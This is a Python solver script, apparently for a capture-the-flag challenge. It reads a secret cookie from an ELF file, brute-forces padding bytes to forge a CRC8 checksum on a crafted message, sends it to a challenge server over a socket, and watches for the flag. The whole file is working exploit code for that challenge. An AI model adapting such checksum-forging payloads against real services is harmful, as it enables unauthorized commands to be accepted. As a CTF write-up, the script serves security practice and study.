import sys, os, socket
import crcmod
import struct
from pwnlib.elf import ELF

def makeMsg(msgId, cookie, parts):
    body = "".join(map(lambda x: chr(len(x)+1) + x, parts))
    
    base = cookie + struct.pack(">H", msgId) + body
    cs = crc8(base)
    msg = "\x0A\x00" + chr(len(base)) + chr(cs) + base
    return chr(len(msg)+1) + msg

def makePayloadMsg(msgId, cookie, parts):
    body = "".join(map(lambda x: chr(len(x)+1) + x, parts))
    
    base = cookie + struct.pack(">H", msgId) + body
 
    targetCS = 0x3
    # Calculate Checksum
    pad = ""
    ii = 0
    target = targetCS ^ crc8(base + "\x00\x00")
    while ii < 0xFFFF:
        pad = struct.pack(">H", ii)
        if target == crc8("\x00"*len(base) + pad):
            break
        ii += 1
   
    msg = "\x0A\x00" + chr(len(base)+len(pad)) + chr(targetCS) + base + pad
    return chr(len(msg)+1) + msg

def solve(cookie):
    result = False
    print("Connect to {}:{}".format(Host,Port))
    sys.stdout.flush()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((Host, Port))
    
    if len(Ticket):
        print(sock.recv(128))
        sock.send(Ticket + "\n")
        print(Ticket)

    sys.stdout.write("COOKIE: {"+ cookie.encode('hex') + "}\n")
    sys.stdout.flush()

    msg = makePayloadMsg(1, cookie, ["\x01\x00", "\x02"])
    sys.stdout.write("Sending Message: {" + msg.encode('hex') + "}\n")
    sys.stdout.flush()
    sock.send(msg.encode('hex') + '\n')
    while True:
        data = sock.recv(1024)
        sys.stdout.write(data)
        sys.stdout.flush()
        if "FLAG" in data:
            result = True
            break
        if "Closed" in data:
            sys.stdout.write("Terminated\n")
            sys.stdout.flush()
            break
    sock.close()
    return result
    
if __name__ == "__main__":
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31340))
    Ticket = os.getenv("TICKET", "")
    File = os.getenv("DIR", "/data") + os.sep + "test.elf"
    f = ELF(File)
    cookie = f.read(f.symbols['COOKIE'],4)

    crc8 = crcmod.mkCrcFun(0x107, rev=False, initCrc=0x0, xorOut=0x00)
    
    solve(cookie)
    '''
    Success = 0
    Trials = 5000
    for ii in range(0,Trials):
        if solve():
            Success += 1
        if ii % 25 == 24:
            print("%d/%d" % (Success, ii+1))
    print("%d/%d" % (Success, Trials))
    '''
